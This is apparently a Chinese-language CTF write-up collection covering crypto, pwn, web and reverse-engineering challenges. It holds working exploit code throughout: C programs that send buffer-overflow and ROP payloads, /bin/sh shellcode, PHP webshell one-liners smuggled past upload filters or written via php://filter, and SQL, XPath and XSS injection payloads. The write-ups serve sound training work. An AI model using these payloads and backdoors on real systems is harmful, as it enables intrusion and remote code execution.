0xb903c6caa8f9e6bf0101c503c032aae6c788988a22160ed552aeee3fd63dcb6adfd1970ad70fee81590f305f629b5c923b31993c2014eac01b9e570dda0300c263b85c05cc608fb7969ec9f3a16c93f2712da0e30782ed295606af6c40832afa484aae2728d0b40a7ff48d1b05df85caf6115b31512497859d04bfda410ff993fe3007fbf76daabc3463a52db01bceae39352697353e6e20a9be690a0aaf747d0ed0fca99d62f411420831fd9e871ae443cbcbfc0080b9dcd7911e7e5b7a3f7a0ada84c1a7572c7a9f09bab18a5afff37bc48e29c8ee19b88c3e7b5a94f758703eff097b4a9b9cfcbc2baf65578551a4ce0886b7be527a6d3c51c22a85c88ffbL e1 = 0x43e1L flag1 = 0x1a3ac0337b1555fe35567d33cec1e553fbb9d19f469482b0aa62abc5de627f7c8b4a493d7b358e1faccf5239662c00811dd903e963b16d667000d08c001f91661e5a74c27eb9bb882aefb099e946afca28f3a81aee588f32c67fde2e21be1276ef7746024d4ed6ced7030591939c63432c335e0660048725c346e16f0071643fd4683c414b7b31aad76a2774cf54c3a9bb4b3487b9e7c5d66e160d6c3a76757a7b016d75d0bdef81a94e6271abacbbbb706ba7242061a78fcd569a141f2ed31500ed219ef0d12387bc9a3575a0bfe04c9a51394c51dc0b575df62e80d8320172145c0ff8f7383d7102bf54ef04384b6c19eea1ac94db77c254f02214cab550faL e2 = 0x75e5L flag2 = 0x64c7bd11cea73ec40a26e1c2c91eb2fcc31d56fc4460bbf58967c08cbda4b2ec2aadf7cde2da106a25ff1916c42aeaf71b4ece5240a7a897189d4352b04e6165cb2788244b2538629384a95a826c517c84d676231e7e3db117b5c32536db5f276e84c5a9f63c23e8e1b8b5c2920a490da053956b5e5e95d3c698e5d72f7470451764a3da20e6286429077169b2a116ac3416e0a6fb3bfb19ef5f2960573f9b8d22b4a5615a96c4c5841d449d64a1fd91576946eb97ebe3af6382350806bbf99c49f6740884fbe4047e089d0773eee6de570355f8f14deb0888b2a76e96740f47cd5f1cdf537b1938e3fb478a8eed1fe34eebf714849da3419a8d9a66aed28247L commonMode(flag1, flag2, e1, e2, N) if __name__ == '__main__': main() 0x06 PwnPwn1 File: pwn1 WriteUp: 直接溢出即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;voidinit_connect() &#123; char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2333", NULL&#125;; execve("/bin/netcat", arg, NULL);&#125;voidwrite_payload(int fd) &#123; char payload[0x30] = "AAAAAAAAAAAAAAAAAAAAAA"; write(fd, payload, strlen(payload));&#125;intmain(void) &#123; int fd[2]; pid_t pid; if (pipe(fd) &lt; 0) &#123; printf("pipe error"); exit(1); &#125; if ((pid = fork()) &lt; 0) &#123; printf("fork error"); exit(1); &#125; if (pid &gt; 0) &#123; /* parent */ close(fd[0]); write_payload(fd[1]); /* simulate command "cat" */ close(fd[1]); &#125; else &#123; /* child */ close(fd[1]); dup2(fd[0], 0); init_connect(); close(fd[0]); exit(0); &#125; exit(0);&#125; Pwn2 File: pwn2 WriteUp: 直接溢出，绕过if语句即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;voidinit_connect() &#123; char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2334", NULL&#125;; execve("/bin/netcat", arg, NULL);&#125;voidwrite_payload(int fd) &#123; char payload[0x14] = "Icemakr__@_xd5ec"; write(fd, payload, strlen(payload));&#125;intmain(void) &#123; int fd[2]; pid_t pid; if (pipe(fd) &lt; 0) &#123; printf("pipe error"); exit(1); &#125; if ((pid = fork()) &lt; 0) &#123; printf("fork error"); exit(1); &#125; if (pid &gt; 0) &#123; /* parent */ close(fd[0]); write_payload(fd[1]); /* simulate command "cat" */ close(fd[1]); &#125; else &#123; /* child */ close(fd[1]); dup2(fd[0], 0); init_connect(); close(fd[0]); exit(0); &#125; exit(0);&#125; Pwn3 File: pwn3 WriteUp: 直接溢出覆盖函数返回地址跳转到luck函数即可getshell 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;voidinit_connect() &#123; char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2335", NULL&#125;; execve("/bin/netcat", arg, NULL);&#125;voidwrite_payload(int fd) &#123; char payload[0x14] = "AAAABBBBCCCCDDDD\xfd\x84\x04\x08"; write(fd, payload, 0x14);&#125;voidinteract(int fd) &#123; int count = 0; char command[0x100]; while (1) &#123; count = 0; memset(command, '\x00', 0x100); while (1) &#123; read(0, command + count, 0x1); if (command[count] == '\n' || count &gt;= 0xfe) &#123; break; &#125; count++; &#125; command[0xff] = '\x00'; write(fd, command, strlen(command)); &#125;&#125;intmain(void) &#123; int fd[2]; pid_t pid; if (pipe(fd) &lt; 0) &#123; printf("pipe error"); exit(1); &#125; if ((pid = fork()) &lt; 0) &#123; printf("fork error"); exit(1); &#125; if (pid &gt; 0) &#123; /* parent */ close(fd[0]); write_payload(fd[1]); interact(fd[1]); /* simulate command "cat" */ close(fd[1]); &#125; else &#123; /* child */ close(fd[1]); dup2(fd[0], 0); init_connect(); close(fd[0]); exit(0); &#125; exit(0);&#125; Pwn4 File: pwn4 WriteUp: 直接溢出跳到数据段上预先存放好的shellcode处即可12345678910111213141516171819BITS 32_start: jmp test1test: pop ebx mov BYTE [ebx + 0x7], al mov DWORD [ebx + 0x8], ebx mov DWORD [ebx + 0xc], eax lea ecx, [ebx + 0x8] xor edx, edx mov al, 0xb int 0x80test1: xor eax,eax call test db &apos;/bin/shA&apos;, 0x00 nasm shellcode.asm编译shellcode Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;voidinit_connect() &#123; char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2336", NULL&#125;; //execve("/bin/netcat", arg, NULL); execve("./pwn4", arg, NULL);&#125;char *get_shellcode() &#123; FILE *f; int c; int count = 0; char *shellcode = (char *)malloc(0x40); f = fopen("shellcode","r"); while((c = fgetc(f)) != EOF) &#123; shellcode[count] = (char)c; count++; &#125; shellcode[count] = '\x00'; printf("%s", shellcode); fclose(f); return shellcode;&#125;voidwrite_payload(int fd) &#123; char payload[0x80] = "AAAABBBBCCCCDDDD\x80\xa0\x04\x08"; strcat(payload, get_shellcode()); write(fd, payload, strlen(payload));&#125;voidinteract(int fd) &#123; int count = 0; char command[0x100]; while (1) &#123; count = 0; memset(command, '\x00', 0x100); while (1) &#123; read(0, command + count, 0x1); if (command[count] == '\n' || count &gt;= 0xfe) &#123; break; &#125; count++; &#125; command[0xff] = '\x00'; write(fd, command, strlen(command)); &#125;&#125;intmain(void) &#123; int fd[2]; pid_t pid; if (pipe(fd) &lt; 0) &#123; printf("pipe error"); exit(1); &#125; if ((pid = fork()) &lt; 0) &#123; printf("fork error"); exit(1); &#125; if (pid &gt; 0) &#123; /* parent */ close(fd[0]); write_payload(fd[1]); interact(fd[1]); /* simulate command "cat" */ close(fd[1]); &#125; else &#123; /* child */ close(fd[1]); dup2(fd[0], 0); init_connect(); close(fd[0]); exit(0); &#125; exit(0);&#125; Pwn5 File: pwn5 WriteUp: 直接溢出覆盖ebp，即stack pivoting，将esp转移到数据段上的可控缓冲区上，然后通过rop来调用system即可1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;voidinit_connect() &#123; char *arg[4] = &#123;"/bin/cat", "10.170.55.102", "2337", NULL&#125;; execve("/bin/netcat", arg, NULL);&#125;voidwrite_payload(int fd) &#123; int i = 0; /* junk */ write(fd, "AAAABBBBCCCC", 0xc); /* adr_stage pivot */ write(fd, "\x00\xa5\x04\x08", 0x4); /* junk */ for (i = 0; i &lt; 0x0804a500 - 0x0804a080 + 4; i++) &#123; write(fd, "A", 0x1); &#125; /* system@plt */ write(fd, "\xd0\x83\x04\x08", 0x4); /* ret of system */ write(fd, "\xef\xbe\xad\xde", 0x4); /* adr_stage + 0x30 */ write(fd, "\x30\xa5\x04\x08", 0x4); for (i = 0; i &lt; 0x20; i++) &#123; write(fd, "A", 0x1); &#125; write(fd, "/bin/sh\x00", 0x8);&#125;voidinteract(int fd) &#123; int count = 0; char command[0x100]; while (1) &#123; count = 0; memset(command, '\x00', 0x100); while (1) &#123; read(0, command + count, 0x1); if (command[count] == '\n' || count &gt;= 0xfe) &#123; break; &#125; count++; &#125; command[0xff] = '\x00'; write(fd, command, strlen(command)); &#125;&#125;intmain(void) &#123; int fd[2]; pid_t pid; if (pipe(fd) &lt; 0) &#123; printf("pipe error"); exit(1); &#125; if ((pid = fork()) &lt; 0) &#123; printf("fork error"); exit(1); &#125; if (pid &gt; 0) &#123; /* parent */ close(fd[0]); write_payload(fd[1]); interact(fd[1]); /* simulate command "cat" */ close(fd[1]); &#125; else &#123; /* child */ close(fd[1]); dup2(fd[0], 0); init_connect(); close(fd[0]); exit(0); &#125; exit(0);&#125; 0x07 Web苏打学姐的朋友 WriteUp: 描述说只有朋友才能访问，只需要修改Rrferrer为允许的就可以，看了给了几个链接，所以随意修改一个就可以了。 苏打学姐撞上碳酸钠了 WriteUp: 打开源代码可以看到给的代码 123456key = "aa3OFF9m"; $pass = isset($_GET['pass']) ? $_GET['pass'] : ""; if ($pass != $key &amp;&amp; sha1($pass)==sha1($key) ) &#123; echo $flag; &#125; else &#123; echo "sha1 conllision&lt;/br&gt;"; 根据意思只要将你输入的字符的sha1值和系统给的aa3OFF9m的sha1值对比，相等就可以得到flag，但是因为这是php 这个地方google也可以google到，只要找到另一个字符加密后也是0e开头就可以被代码判断相等了，至于这段特殊的字符，你可以自己脚本去碰撞。就是随机加密字符，一直到0e开头为止，也可以去搜索一下，坑呢个别人已经碰过呢。 最后payload 吓得苏打学姐都编码了 WriteUp: 一样打开源代码 可以看到代码123456789101112131415161718192021error_reporting(0); function show_flag()&#123; $flag = "a f4ke flag"; echo $flag; exit(); &#125; function anti()&#123; $query = $_SERVER['QUERY_STRING']; $query = urldecode($query); $query = strtolower($query); if(preg_match('/show/', $query) or preg_match('/flag/', $query))&#123; return false; &#125;else&#123; return true; &#125; &#125; if(anti())&#123; eval('"$str=(string)'.$_GET['str'].'";'); &#125;else&#123; echo 'detect the evil words'; &#125; 根据代码可以知道，只需要执行show_flag()这个函数就可以得到flag，并且代码将你传进来的字符str当着代码来执 行。 但是你不能直接就show_flag，会被anti()这个函数检查到，所以既然能够执行你传进来的代码，方式就很多了。你 可以把show_flag的编码一下,并且解码一下，就可以绕过了，这个给一个payload1str = $&#123;$&#123;eval(base64_decode($_GET[0]))&#125;&#125;&amp;0=c2hvd19mbGFnKCk7 其实这里给了eval就相当给了一个shell了，完全可以用菜刀连接了， 构造http://xxxxxxxxxxxx/evil.php?str=${${eval($_POST[&#39;pass&#39;])}} 苏打学姐要打针了 Description: 学xml当然也要学习学习xpath咯–&gt;http://www.w3school.com.cn/xpath/xpath_syntax.asp WriteUp: 这个打开也可以看到源码 示，这是一个随xml文件中元素进行输出的代码。题目也给了xpath语法链接，其中有一个重要的符号 | ,它可以将两个查询并焦输出， 原来的查询代码:$query = “user/username[@id=’”.$uid.”‘]”; 所以我们可以构造一个特殊的查询:1&apos;]| //* |user[&apos; 解释:先用 ‘] 将原来的括号闭合,再来一个查询所有元素的查询语句 //* ,最后使用 user[‘ 将最后的符号闭合。三 个查询使用 | 连接起来。 苏打学姐不会PHP WriteUp: 打开查看源代码有一个 示: .index.php.swp ,这是一个vim编辑器异常退出时生成的备份文件。所以下载下来恢复一下，恢复，有很多人直接记事本打开看到，但是很乱，使用vim的命令恢复就很规整。 命令:1vim ‐r .index.php.swp 得到源码 1234567891011121314151617181920&lt;?php error_reporting(0); echo "&lt;!‐‐.index.php.swp‐‐&gt;"; if(!$_GET['id'])&#123; header('Location: index.php?id=1');exit(); &#125; $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.'))&#123; echo 'what are you ganshane?';return ; &#125; $data = @file_get_contents($a,'r'); if($data=="me7ell‐like‐you!" and $id==0 and eregi("biubiu".substr($b,0,1),"biubiu4") and substr($b,0,1)!=4)&#123;echo $flag; &#125; else&#123; print "go on...!!!";&#125;?&gt; 绕过分析: id==0且!$_GET(“id”)为假,这个地方使用php弱类型就行。 比如构造:id=false，id=0e… $a不包含点且a文件内容为特定的 a=http://your vps IP/test`把其中ip用iphex编码为0x739F915C iphex工具 在线 最简单是使用php伪协议。使用php://input输入流 b满足eregi(“biubiu”.substr( b,0,1)!=4。这是低版本php的eregi函数的问题。 使用b=*, b=(什么也不填),都可 以绕过。 回字有几种写法 WriteUp: url后面跟了一个id参数，猜测是sql注入。但是直接注入会发现被waf拦截。那么如何绕过waf呢，waf自身规则很严格，基本过滤了所有敏感字符。我们post一个id参数，会被程序接收但是也同样被waf拦截了。但我们可以脑补一下程序员一定是使用了能同时接收get和post型的request函数，而request函数还能够通过cookie接收参数，而waf只对get和post来的数据进行了处理，而忽略了cookie，造成注入。 最终payload：Cookie:id=-1 union select 1,2,flag,4 from `where` easyXSS Description: http://ctf.math1as.com/xss2.php请使用chrome 54/55进行本挑战payload必须无需交互,成功弹出1即可请注意,无需交互指的是用户不能做除了打开页面外的任何操作完成挑战后,把截图和payload发到邮箱 mathias@l-team.org 来获得你的flag WriteUp: 过滤了script 而其他几乎没有限制 所以主要的思路是要绕过Chrome的auditor 这里的通用方法是在敏感关键字处加入script 比如 当然,也可以用一些字符集的问题 比如 然后关键字插入%1B%28B来绕过 xss challenge Description: 题目链接 http://ctf.math1as.com/xss.php请使用最新的浏览器(chrome 54/firefox 50)进行本挑战payload必须无需交互,请注意,无需交互指的是用户不能做除了打开页面外的任何操作,成功弹出1即可完成挑战后,把截图和payload发到邮箱 mathias@l-team.org 来获得你的flag WriteUp: 一道dom-xss,这里过滤了大部分的符号,比如.点号 ( 括号等 还有除了onfocus外的大部分事件 要构造出一个无需交互的payload 你需要使用autofocus 但是由于标签是并不在标准内 因此需要加入tabindex=0 使其支持这个事件 最后加入id=”2” location.hash处输入#2即可 但是我们的1被过滤了,怎么办呢 使用prompt函数,它支持用es6模板字符串传参 因此直接${3-2} 就成功的绕过了 1http://ctf.math1as.com/xss.php?content=%22id=2%0atabindex=0%0aonfocus=prompt`$&#123;3-2&#125;`|%22#2 当然,也可以使用标签的window.name来实现参数的传递 方法不再赘述 苏打学姐的相册 Description: 苏打学姐有一个小相册,首页是她最喜欢的一张照片,她把flag也放在相册里了,你能找到它吗?(说不定flag旁边还有苏打学姐的全套表情包^_^ WriteUp: 很明显这是一道上传绕过,先上源代码:index.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;form id=&quot;uploadFileform&quot; action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; &gt; &lt;center&gt; &lt;img src=&quot;static/upload/suda.png&quot; /&gt; &lt;hr style=&quot;size: 1&quot; /&gt; &lt;/center&gt; &lt;center&gt; &lt;input id=&quot;uploadImage&quot; value=&quot;&quot; type=&quot;file&quot; name=&quot;uploadImage&quot; size=&quot;50&quot; /&gt; &lt;p&gt;今年苏打不收图,收图只收PNG&lt;/p&gt; &lt;p&gt; &lt;input class=&quot;primary&quot; type=&quot;button&quot; value=&quot;submit&quot; onclick=&quot;uploadImages();&quot;/&gt; &lt;/p&gt; &lt;hr style=&quot;size: 1&quot; /&gt; &lt;/center&gt; &lt;/form&gt;&lt;script src=&quot;jquery-3.1.1.min.js&quot;&gt;&lt;/script&gt;&lt;script&gt;function uploadImages() &#123; var str = $(&quot;#uploadImage&quot;).val().toLowerCase(); if(str.length!=0)&#123; var reg = &quot;.*\\.(png|jpg)&quot;; var r = str.match(reg); if(r == null)&#123; alert(&quot;你往上传了个啥?!&quot;); &#125; else &#123; if(window.ActiveXObject) &#123; var image=new Image(); image.dynsrc=str; if(image.fileSize&gt;51200)&#123; alert(&quot;这图....有点大啊......别超50K吧&quot;); return false; &#125; &#125; else&#123; var size = document.getElementById(&quot;uploadImage&quot;).files[0].size; if(size&gt;51200) &#123; alert(&quot;这图....有点大啊......别超50K吧&quot;); return false; &#125; &#125; $(&apos;#uploadFileform&apos;).submit(); &#125; &#125; else &#123; alert(&quot;图呢?&quot;); &#125;&#125;&lt;/script&gt; uload.php 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?php//ini_set(&quot;display_errors&quot;,&apos;On&apos;);if(!$_FILES)&#123; exit(&quot;图呢?&quot;);&#125;if($_FILES[&apos;uploadImage&apos;][&apos;size&apos;] &gt; 51200000)&#123; exit(&quot;这图....有点大啊......别超50K吧&quot;);&#125;if($_FILES[&apos;uploadImage&apos;][&apos;type&apos;] !== &quot;image/png&quot;)&#123; exit(&quot;你往上传了个啥?&quot;);&#125;$upload_dir = &apos;static/upload/&apos;;$file_name = basename($_FILES[&apos;uploadImage&apos;][&apos;name&apos;]);$file_path = $upload_dir.$file_name;$file_ext= substr($file_name, strrpos($file_name, &apos;.&apos;) + 1);if(eregi(&quot;^.*\.(php|php5|php4|php3|phps|ini|htaccess)$&quot;,$file_name))&#123; exit(&quot;你往上传了个啥?&quot;);&#125;$file = fopen($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;],&apos;rb&apos;);$bin = fread($file,filesize($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;]));fclose($file);$info = unpack(&apos;H8head&apos;,$bin);if(!($info[&apos;head&apos;] === &apos;89504e47&apos; ))&#123; exit(&quot;你往上传了个啥?&quot;);&#125;$black_list = array(&quot;&lt;?php&quot;,&quot;&lt;%&quot;,&quot;eval&quot;,&quot;assert&quot;);foreach($black_list as $key=&gt;$value)&#123; if(stristr($bin,$value))&#123; exit(&quot;你是不是往图里插什么东西了.....我看出来了!&quot;); &#125;&#125;move_uploaded_file($_FILES[&apos;uploadImage&apos;][&apos;tmp_name&apos;],$file_path);echo &apos;Uploaded: &apos;.$file_path;?&gt; 好吧,我们看有哪几个地方限制了上传: javascript 后缀名黑名单 MIME类型 检测了文件头 检测了文件内容里是不是含有&lt;?php,&lt;%,eval,assert 那我们上传一张正常的图片,然后在burp里修改后缀为可以被解析的phtml,然后往图片内容里插入一句话木马: 1&lt;script language="php"&gt;$e = $REQUEST['e'];$arr = array($POST['pass'],);array_filter($arr, base64_decode($e));&lt;/script&gt; 绕过了内容检测,菜刀连上就可以啦 (有同学对这个后门有疑问,这个菜刀连的时候地址填http://xxx.xxx.xxx/eval.phtml?e=YXNzZXJD就可以啦,详细参见P总的博客https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html) 苏打学姐的另一个相册 Description: 咳咳..前面那个相册在前两天大家做题的时候被苏打发现了,所以她紧急删掉了自己珍藏的表情包……….但是亲爱的萌新们可能有所不知,苏打学姐的黑照在协会已流传多年,并且协会的高年级成员建了一个网站专门展示苏打学姐的黑照…….但好景不长,由于在网站上公开的黑照在网络上的影响过于恶劣,应有关部门要求下架了绝大部分照片. 而协会的大黑阔们把资源打了个加密包转移到了云上,链接,解压密码都还存在这个站上. 每次都通过一种极其”hack”的方式访问….. WriteUp: 我们还是先看一下源代码: index.php1234567891011121314&lt;?php//int_set("display_errors","On");if($_POST['shellname6ba3'] &amp;&amp; $_POST['content8b7e'])&#123; $prefix = "&lt;?php exit(you die); ?&gt;"; $content = $prefix.$_REQUEST['content8b7e']; file_put_contents($_REQUEST['shellname6ba3'],$content);&#125;$include_file = empty($_GET['file']) ? "photo":$_GET['file'];if(preg_match('/\.\./',$include_file))&#123; exit('Impossible!');&#125;include($include_file.'.php');?&gt; photo.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phpif(!$_GET['id'])&#123; $_GET['id'] = 1;&#125;function query_filter($str)&#123; $str = strtolower($str); $black_list = array("\\","and","or"," ","/","*","+","="," ","\n"); $safe_str = str_replace($black_list,array(''),$str); /* while($str !== $safe_str)&#123; $str = $safe_str; $safe_str = str_replace($black_list,array(''),$str); &#125; */ return $safe_str;&#125;$query_str = query_filter($_GET['id']);$db_host = 'localhost';$db_name = 'xdsec';$db_username = 'web';$db_password = "testr";$mysqli = mysqli_connect($db_host, $db_username, $db_password, $db_name);if(!$mysqli)&#123; exit("DB error!");&#125;$sql = "select * from pics where id =".$query_str;//echo $sql;$result = $mysqli-&gt;query($sql);if(!$result)&#123; exit("Query failed!");&#125;$row = mysqli_fetch_row($result);$pre_link = "index.php?file=photo&amp;id=".($_GET['id']&lt;=1 ? 1:$_GET['id']-1);$next_link = "index.php?file=photo&amp;id=".($_GET['id']+1);print &lt;&lt;&lt;HTML&lt;html&gt;&lt;title&gt;&lt;/title&gt;&lt;body&gt; &lt;center&gt; &lt;DIV ID="soccer"&gt; &lt;img SRC="&#123;$row[1]&#125;" border="0" onclick="javascript:window.open(this.src);" style="cursor:pointer;"/&gt; &lt;/DIV&gt; &lt;hr&gt; &lt;p&gt;Description: &#123;$row[3]&#125;&lt;/p&gt; &lt;p&gt;Posted on &#123;$row[2]&#125;&lt;/p&gt; &lt;hr&gt; &lt;p&gt;&lt;a href="&#123;$pre_link&#125;"&gt;上一张&lt;/p&gt;&lt;p&gt;&lt;a href="&#123;$next_link&#125;"&gt;下一张&lt;/p&gt; &lt;/center&gt; &lt;SCRIPT&gt;var msecs=60;var counter=0;function soccerOnload()&#123; setTimeout("blink()", msecs)&#125;function blink()&#123; soccer.style.visibility=(soccer.style.visibility=="hidden") ? "visible" : "hidden" counter+=1; setTimeout("blink()", msecs)&#125;soccerOnload() &lt;/SCRIPT&gt;&lt;/body&gt;&lt;/html&gt;HTML;?&gt; 首先这个题目看网址就能发现一个?file=photo参数,所以很有可能有文件包含,事实也是这样子的,所以我们先用1php://filter/convert.base64-encode/resource=index 读出index的源代码,得到了可以写文件的参数,但是无论如何都会在你写的文件前面加上exit,我们需要绕过这个exit 所以构造payload: 1content8b7e=aaaPD9waHAgZXZhbCgkX1BPU1RbJ3QnXSkgPz4=&amp;shellname6ba3=php://filter/write=convert.base64-decode/resource=shell.php content8b7e参数中前面的aaa是为了补齐&lt;?php exit(you die); ?&gt;中13个可以被base64解码的字节(phpexityoudie,其余的将被跳过)为16个字节,因为base64是每4个字节解码成3个字节,这样一来三个a连同前面的一起被当做base64编码解码成乱码从而绕过了exit的执行,后面的PD9waHAgZXZhbCgkX1BPU1RbJ3QnXSkgPz4=&amp;shellname6ba3=被解码成一句话木马写入文件,拿菜刀连上就可以了 关于参数shellname6ba3,不再详细解释,详见P总博客 https://www.leavesongs.com/PENETRATION/php-filter-magic.html PS: 这个题的数据库里还有”苏打门”的下载链接,Flag就是解压密码(当然…..下载下来以后其实是葫芦娃……) 0x08 ReEasy GUI Description: 最经典的Windows GUI逆向, 超简单的说. File: EasyGUI.zip WriteUp: 的确是最经典的Windows GUI逆向. 由Win AIP写成. OD直接下断点 1bp GetDlgItemTextA 断下来之后, Ctrl+F9回到用户空间, 直接就能找到验证部分的代码. 直接OD里面调试, 也可以根据地址在IDA里面读汇编/F5. 或者全程IDA分析可以(Ctrl+F12显示字符串, 根据输出的字串定位代码位置). 函数地址0x0401340, 加密方式是key和密文循环XOR, 计算后和输入进行比对(所以最懒得话可以直接在OD里试N次读出password). python脚本: 123456789101112key = [ord(x) for x in "WinAPI"] * 10secret = [0x20,0x58,0x00,0x20,0x20,0x20,0x08,0x58,0x1D,0x1E,0x3F,0x25,0x33]flag = []for i in xrange(13): flag.append(secret[i] ^ key[i])flag = "".join([chr(s) for s in flag])print(flag)# flag:# w1napi_1s_old Easy Linux Description: IDA不好用了…那你知道GDB么? Linux下的神级动态调试器哦. PS: 主程序是EasyLinux. 复制到虚拟机后记得”chmod +x EasyLinux” File: EasyLinux.zip WriteUp: 就是个Linux下的逆向而已…其实非常简单. 这个程序为了防止被IDA直接静态分析, 简单的玩了点低级的花招: data.dat实际上是个.so文件(Linux的dll), 执行主程序后主程序会装载这个data.dat(Linux下文件没有后缀名这一说法). 真正的校验函数藏在这个data.dat中…所以有以下分析方案: 直接IDA分析这个data.dat, IDA会识别出来. 然后F5大法即可. 但是要求能够看出data.dat的本质. 在Linux下用GDB动态调试主程序, 因为很简单所以不是很难. 这也是本题当初的目的. 装载data.dat的步骤发生在main函数执行之前. 读附带的源代码可以明白原理. 校验函数及其简单, 仅仅是将密文的每一位和0xCC异或. python脚本: 12345678910secret = [0x9B,0xFF,0xA0,0xAF,0xFC,0xA1,0xA9,0xFE,0x80,0xA5,0xA2,0xB9,0xB4]key = 0xCCflag = [(key ^ x) for x in secret]flag = "".join([chr(s) for s in flag])print(flag)# flag# W3lc0me2Linux 壶中的大银河 Description: 你知道Linux的signal机制么? 这次是Easy级的, 根本没有难度嘛. File: Galaxy.zip WriteUp: 有人吐槽之前LCTF出现了这个名字…实际上这个题目就是它的超简化版本(所以是Easy嘛). 听起来很迷, 实际上仅仅是Linux Signal而已. 首先程序在通过signal函数将校验函数和alarm信号关联起来. 然后正常的进行输入. 得到用户输入后调用alarm(1). 该函数会在延迟1秒后生成alarm信号. 随后校验函数被调用. (Google Linux signal即可详细了解…) 校验函数仍然不是很难, 在程序中被命名为handler. 用户输入被保存在全局变量中, 校验函数从中读取输入. 输入要求长度为20. 然后对输入进行一次循环. 偶数位(i = 0, 2, 4…): input[i] = input[i] ^ 0x9 奇数位(i = 1, 3, 5…): input[i] = input[i] ^ input[0] 计算后和正确字串进行比较, 若不相等则将一个全局变量置为0(否则为1). main函数根据该标志输出结果语句. python脚本: 1234567891011121314secret = "8BVXznh]z^VXdAfC&#125;PgE"secret = [ord(x) for x in secret]for i in xrange(20): if (i % 2) == 0: secret[i] = secret[i] ^ 0x09 else: secret[i] = secret[i] ^ secret[0]flag = "".join([chr(s) for s in secret])print(flag)# flag# 1s_is_also_important 蓬莱的玉枝 Description: 一样的GUI. 有本事不拆使魔强行过呀(雾). File: rand.zip WriteUp: 仍然是win API的GUI. 实际上除了校验部分和EasyGUI是一个图形界面…(图形界面长什么样无所谓嘛) 在全局变量处保存了两个值seek和password, 均用于校验输入. 在程序运行初始化时: 计算程序文件的校验和, 如果文件被修改, 则校验和不相等, 修改全局变量中的seek. 在校验函数执行前后: 检测程序是否被调试器调试(仅仅使用了一个简单的API进行测试), 若没有被调试则将全局变量password的每一位和0x5异或.否则和0x9异或. 除去这两步, 剩下的方法和EasyGUI基本没有区别. 检验函数是使用rand生成一串序列, rand的种子数即为seek. 之后将password和rand序列按位异或(都是异或233). 计算后和输入进行比对. 得到flag思路: password ^ 0x5 -&gt; password ^ rand(seek = 17) -&gt; flag C脚本: 123456789101112131415161718192021222324252627282930//Flag://LCTF&#123;learn_more_think_more&#125;//compile command : gcc -std=c99 -o getflag getflag.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; unsigned int seek = 17; unsigned char key = '\x05'; unsigned char randnum; unsigned char res; char password[] = "\x17\x14\xe7\x83\xa4\x63\xac\x91\xcb\xc5\x42\x4a\x8b\x5b\x9d\x93\x98\x5\x20\xb1\x29\xc1\x8c\x53\x92\x8d\x36"; srand(seek); for(int i = 0; i &lt; strlen(password); ++i)&#123; randnum = (unsigned char)((unsigned int)rand() % 0xFF); res = password[i] ^ randnum; res = res ^ key; printf("%c", res); &#125; puts(""); return 0;&#125; 永遠の春夢 Description: ** 看似杂乱的没有通路…仔细观察下就会发现其实很简单呢~ PS: 这次有FB了哦~ Hint: SMC - Self Modify Code. 注意.text段的属性哦~ File: 123.zip WriteUp: 典型的SMC(self modify code)程序. 具体的函数运行方式读源代码即可了解(已附在wp内). 程序是在编译后手动进行的首次加密…可以写个脚本, 或者IDA Script, 也可以更暴力的直接用WinHex(内置了XOR Edit). 简单来说, 程序在获取用户输入后会解密两块代码, 这两块代码分别对输入进行处理和检验. 有趣的是, 在处理输入后, 程序会立即再次将代码块加密回去. 而且两个代码块是交替解密的 – 也就是说没法dump内存. 对于这个程序, 因为逻辑简单, 所以定位了要解密的代码块的地址和长度以及使用的key后, 直接IDA Script(或者其他手段)将代码块全部还原. 然后F5大法即可. 需要注意的是, 处理加解密的函数F5没法第一次就正确分析…或许直接读汇编就可以了(也可以修正F5的结果). 这个里简单说一下校验: 对于密文字串secret: secret[i] = (secret[i] + 0x30) % 0xFF 对于输入pd: pd[i] = 0xFF &amp; (((pd[i] &lt;&lt; 4) &amp; 0xFF) | ((pd[i] &gt;&gt; 4) &amp; 0x0F)) (交换高低位) 最后对pd和secret进行校验: pd[i] ^ 0x55 == secret[i] python脚本: 12345678910secret = [97, 49, 223, 1, 178, 48, 81, 49, 112, 147, 50, 112, 210, 162, 51, 147, 225, 210, 226, 23, 82]secret = [(x + 0x30) % 0xFF for x in secret]secret = [x ^ 0x55 for x in secret]secret = [0xFF &amp; (((x &lt;&lt; 4) &amp; 0xFF) | ((x &gt;&gt; 4) &amp; 0x0F)) for x in secret]flag = &quot;&quot;.join([chr(s) for s in secret])print(flag)# Flag:# LCTF&#123;SMC_is_excited!&#125; RE60 Description:考验你re基本功的时候到啦~ File:re60.3111C1CAF04BADB492CC8CC37F61218B740B4818 WriteUp: 拿到文件先用file查看 IDA打开发现在main函数中的两个字符串 